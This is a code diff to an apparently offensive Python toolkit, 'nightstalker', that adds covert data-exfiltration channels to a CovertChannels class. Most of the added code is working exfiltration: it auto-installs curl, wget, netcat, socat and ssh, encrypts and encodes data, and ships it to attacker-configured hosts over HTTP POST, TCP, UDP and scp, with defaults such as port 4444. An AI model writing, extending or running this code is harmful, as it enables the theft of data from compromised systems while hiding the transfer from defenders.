@@ -22,6 +22,11 @@ from email.mime.multipart import MIMEMultipart
 import dns.resolver
 import dns.message
 import dns.query
+import subprocess
+import tempfile
+import os
+
+from nightstalker.utils.tool_manager import ToolManager
 
 logger = logging.getLogger(__name__)
 
@@ -39,17 +44,26 @@ class ExfiltrationChannel:
 class CovertChannels:
     """Manages multiple covert exfiltration channels"""
     
-    def __init__(self, config: Dict[str, Any] = None):
-        self.config = config or {}
+    def __init__(self, config: Optional[Dict[str, Any]] = None):
+        self.config = config if config is not None else {}
         self.channels: Dict[str, ExfiltrationChannel] = {}
         self.active_channels: List[str] = []
         self.exfiltration_history: List[Dict[str, Any]] = []
+        
+        # Initialize required tools
+        self._init_tools()
         
         # Initialize channels
         self._setup_channels()
         
         # Encryption key for payloads
         self.encryption_key = self.config.get('encryption_key', 'nightstalker_key_2024')
+    
+    def _init_tools(self):
+        """Initialize and check required external tools"""
+        required_tools = ['curl', 'wget', 'nc', 'socat', 'openssl', 'ssh']
+        logger.info("Checking required tools for exfiltration...")
+        ToolManager.check_and_install_tools(required_tools, logger)
     
     def _setup_channels(self):
         """Setup available exfiltration channels"""
@@ -86,10 +100,50 @@ class CovertChannels:
                 'retry_count': 2,
                 'timeout': 60
             },
+            'curl': {
+                'name': 'Curl HTTP Exfiltration',
+                'enabled': True,
+                'priority': 5,
+                'max_payload_size': 16384,
+                'retry_count': 3,
+                'timeout': 45
+            },
+            'wget': {
+                'name': 'Wget HTTP Exfiltration',
+                'enabled': True,
+                'priority': 6,
+                'max_payload_size': 16384,
+                'retry_count': 3,
+                'timeout': 45
+            },
+            'netcat': {
+                'name': 'Netcat TCP Exfiltration',
+                'enabled': True,
+                'priority': 7,
+                'max_payload_size': 32768,
+                'retry_count': 2,
+                'timeout': 30
+            },
+            'socat': {
+                'name': 'Socat UDP Exfiltration',
+                'enabled': True,
+                'priority': 8,
+                'max_payload_size': 32768,
+                'retry_count': 2,
+                'timeout': 30
+            },
+            'ssh': {
+                'name': 'SSH SCP Exfiltration',
+                'enabled': True,
+                'priority': 9,
+                'max_payload_size': 65536,
+                'retry_count': 2,
+                'timeout': 60
+            },
             'bluetooth': {
                 'name': 'Bluetooth Exfiltration',
                 'enabled': False,  # Disabled by default
-                'priority': 5,
+                'priority': 10,
                 'max_payload_size': 512,
                 'retry_count': 3,
                 'timeout': 20
@@ -400,6 +454,254 @@ class CovertChannels:
             logger.error(f"Bluetooth exfiltration failed: {e}")
             return False
     
+    def curl_exfiltration(self, data: bytes, target_url: str, headers: Optional[Dict[str, str]] = None) -> bool:
+        """Exfiltrate data via curl HTTP POST"""
+        try:
+            if not ToolManager.is_tool_installed('curl'):
+                logger.error("Curl not installed")
+                return False
+            
+            # Encrypt and encode data
+            encrypted_data = self.encrypt_payload(data)
+            encoded_data = base64.b64encode(encrypted_data).decode('utf-8')
+            
+            # Create temporary file for data
+            with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
+                temp_file.write(encoded_data)
+                temp_file_path = temp_file.name
+            
+            try:
+                # Build curl command
+                cmd = ['curl', '-X', 'POST', '-d', f'@{temp_file_path}', target_url]
+                
+                # Add headers if provided
+                if headers is not None:
+                    for key, value in headers.items():
+                        cmd.extend(['-H', f'{key}: {value}'])
+                
+                # Add timeout
+                cmd.extend(['--connect-timeout', str(self.channels['curl'].timeout)])
+                
+                logger.info(f"Executing curl exfiltration: {' '.join(cmd)}")
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=self.channels['curl'].timeout)
+                
+                success = result.returncode == 0
+                logger.info(f"Curl exfiltration {'successful' if success else 'failed'}")
+                
+                return success
+                
+            finally:
+                # Clean up temporary file
+                try:
+                    os.unlink(temp_file_path)
+                except:
+                    pass
+                    
+        except subprocess.TimeoutExpired:
+            logger.error("Curl exfiltration timeout")
+            return False
+        except Exception as e:
+            logger.error(f"Curl exfiltration failed: {e}")
+            return False
+
+    def wget_exfiltration(self, data: bytes, target_url: str, headers: Optional[Dict[str, str]] = None) -> bool:
+        """Exfiltrate data via wget HTTP POST"""
+        try:
+            if not ToolManager.is_tool_installed('wget'):
+                logger.error("Wget not installed")
+                return False
+            
+            # Encrypt and encode data
+            encrypted_data = self.encrypt_payload(data)
+            encoded_data = base64.b64encode(encrypted_data).decode('utf-8')
+            
+            # Create temporary file for data
+            with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
+                temp_file.write(encoded_data)
+                temp_file_path = temp_file.name
+            
+            try:
+                # Build wget command
+                cmd = ['wget', '--post-file', temp_file_path, target_url, '-O', '-']
+                
+                # Add headers if provided
+                if headers is not None:
+                    for key, value in headers.items():
+                        cmd.extend(['--header', f'{key}: {value}'])
+                
+                # Add timeout
+                cmd.extend(['--timeout', str(self.channels['wget'].timeout)])
+                
+                logger.info(f"Executing wget exfiltration: {' '.join(cmd)}")
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=self.channels['wget'].timeout)
+                
+                success = result.returncode == 0
+                logger.info(f"Wget exfiltration {'successful' if success else 'failed'}")
+                
+                return success
+                
+            finally:
+                # Clean up temporary file
+                try:
+                    os.unlink(temp_file_path)
+                except:
+                    pass
+                    
+        except subprocess.TimeoutExpired:
+            logger.error("Wget exfiltration timeout")
+            return False
+        except Exception as e:
+            logger.error(f"Wget exfiltration failed: {e}")
+            return False
+
+    def netcat_exfiltration(self, data: bytes, target_host: str, target_port: int) -> bool:
+        """Exfiltrate data via netcat TCP"""
+        try:
+            if not ToolManager.is_tool_installed('nc'):
+                logger.error("Netcat not installed")
+                return False
+            
+            # Encrypt and encode data
+            encrypted_data = self.encrypt_payload(data)
+            encoded_data = base64.b64encode(encrypted_data).decode('utf-8')
+            
+            # Create temporary file for data
+            with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
+                temp_file.write(encoded_data)
+                temp_file_path = temp_file.name
+            
+            try:
+                # Build netcat command
+                cmd = ['nc', target_host, str(target_port)]
+                
+                logger.info(f"Executing netcat exfiltration: {' '.join(cmd)}")
+                
+                # Use subprocess with input from file
+                with open(temp_file_path, 'r') as input_file:
+                    result = subprocess.run(cmd, stdin=input_file, capture_output=True, text=True, timeout=self.channels['netcat'].timeout)
+                
+                success = result.returncode == 0
+                logger.info(f"Netcat exfiltration {'successful' if success else 'failed'}")
+                
+                return success
+                
+            finally:
+                # Clean up temporary file
+                try:
+                    os.unlink(temp_file_path)
+                except:
+                    pass
+                    
+        except subprocess.TimeoutExpired:
+            logger.error("Netcat exfiltration timeout")
+            return False
+        except Exception as e:
+            logger.error(f"Netcat exfiltration failed: {e}")
+            return False
+
+    def socat_exfiltration(self, data: bytes, target_host: str, target_port: int) -> bool:
+        """Exfiltrate data via socat UDP"""
+        try:
+            if not ToolManager.is_tool_installed('socat'):
+                logger.error("Socat not installed")
+                return False
+            
+            # Encrypt and encode data
+            encrypted_data = self.encrypt_payload(data)
+            encoded_data = base64.b64encode(encrypted_data).decode('utf-8')
+            
+            # Create temporary file for data
+            with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
+                temp_file.write(encoded_data)
+                temp_file_path = temp_file.name
+            
+            try:
+                # Build socat command
+                cmd = ['socat', 'STDIN', f'UDP:{target_host}:{target_port}']
+                
+                logger.info(f"Executing socat exfiltration: {' '.join(cmd)}")
+                
+                # Use subprocess with input from file
+                with open(temp_file_path, 'r') as input_file:
+                    result = subprocess.run(cmd, stdin=input_file, capture_output=True, text=True, timeout=self.channels['socat'].timeout)
+                
+                success = result.returncode == 0
+                logger.info(f"Socat exfiltration {'successful' if success else 'failed'}")
+                
+                return success
+                
+            finally:
+                # Clean up temporary file
+                try:
+                    os.unlink(temp_file_path)
+                except:
+                    pass
+                    
+        except subprocess.TimeoutExpired:
+            logger.error("Socat exfiltration timeout")
+            return False
+        except Exception as e:
+            logger.error(f"Socat exfiltration failed: {e}")
+            return False
+
+    def ssh_exfiltration(self, data: bytes, ssh_config: Dict[str, Any]) -> bool:
+        """Exfiltrate data via SSH SCP"""
+        try:
+            if not ToolManager.is_tool_installed('ssh'):
+                logger.error("SSH not installed")
+                return False
+            
+            # Get SSH configuration
+            host = ssh_config.get('host')
+            username = ssh_config.get('username')
+            key_file = ssh_config.get('key_file')
+            remote_path = ssh_config.get('remote_path', '/tmp/')
+            
+            if not all([host, username]):
+                logger.error("SSH configuration incomplete")
+                return False
+            
+            # Encrypt and encode data
+            encrypted_data = self.encrypt_payload(data)
+            encoded_data = base64.b64encode(encrypted_data).decode('utf-8')
+            
+            # Create temporary file for data
+            with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
+                temp_file.write(encoded_data)
+                temp_file_path = temp_file.name
+            
+            try:
+                # Build SCP command
+                timestamp = str(int(time.time()))
+                remote_file = f"{remote_path}/exfil_{timestamp}.dat"
+                
+                if key_file:
+                    cmd = ['scp', '-i', key_file, temp_file_path, f'{username}@{host}:{remote_file}']
+                else:
+                    cmd = ['scp', temp_file_path, f'{username}@{host}:{remote_file}']
+                
+                logger.info(f"Executing SSH exfiltration: {' '.join(cmd)}")
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=self.channels['ssh'].timeout)
+                
+                success = result.returncode == 0
+                logger.info(f"SSH exfiltration {'successful' if success else 'failed'}")
+                
+                return success
+                
+            finally:
+                # Clean up temporary file
+                try:
+                    os.unlink(temp_file_path)
+                except:
+                    pass
+                    
+        except subprocess.TimeoutExpired:
+            logger.error("SSH exfiltration timeout")
+            return False
+        except Exception as e:
+            logger.error(f"SSH exfiltration failed: {e}")
+            return False
+    
     def exfiltrate_data(self, data: bytes, channels: List[str] = None, 
                        channel_configs: Dict[str, Any] = None) -> Dict[str, bool]:
         """Exfiltrate data using multiple channels"""
@@ -440,6 +742,30 @@ class CovertChannels:
                 elif channel == 'bluetooth':
                     target_address = channel_configs.get('bluetooth_target', '')
                     success = self.bluetooth_exfiltration(data, target_address)
+                    
+                elif channel == 'curl':
+                    target_url = channel_configs.get('curl_url', 'https://httpbin.org/post')
+                    headers = channel_configs.get('curl_headers', {})
+                    success = self.curl_exfiltration(data, target_url, headers)
+                    
+                elif channel == 'wget':
+                    target_url = channel_configs.get('wget_url', 'https://httpbin.org/post')
+                    headers = channel_configs.get('wget_headers', {})
+                    success = self.wget_exfiltration(data, target_url, headers)
+                    
+                elif channel == 'netcat':
+                    target_host = channel_configs.get('netcat_host', '127.0.0.1')
+                    target_port = channel_configs.get('netcat_port', 4444)
+                    success = self.netcat_exfiltration(data, target_host, target_port)
+                    
+                elif channel == 'socat':
+                    target_host = channel_configs.get('socat_host', '127.0.0.1')
+                    target_port = channel_configs.get('socat_port', 4444)
+                    success = self.socat_exfiltration(data, target_host, target_port)
+                    
+                elif channel == 'ssh':
+                    ssh_config = channel_configs.get('ssh_config', {})
+                    success = self.ssh_exfiltration(data, ssh_config)
                     
                 else:
                     logger.warning(f"Unknown channel: {channel}")
